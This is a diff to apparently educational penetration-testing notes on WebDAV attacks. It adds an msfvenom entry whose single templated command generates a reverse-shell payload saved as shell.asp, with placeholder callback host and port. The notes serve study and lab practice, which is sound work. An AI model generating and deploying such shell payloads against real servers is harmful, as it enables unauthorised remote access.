@@ -80,6 +80,16 @@ cadaver [OPTIONS] <URL>
 
 ![cadaver](.gitbook/assets/image-20230310124041568.png)
 
+> [**`msfvenom`**](https://www.kali.org/tools/metasploit-framework/#msfvenom) - a Metasploit standalone payload generator and encoder
+
+```bash
+msfvenom -p <PAYLOAD> LHOST=<LOCAL_HOST_IP> LPORT=<PORT> -f <file_type> > shell.asp
+```
+
+![msfvenom](.gitbook/assets/image-20230310154748079.png)
+
+
+
 > 🔬 Check some hands-on labs in the [IIS - WebDAV section](windows-attacks/iis-webdav.md)
 
 
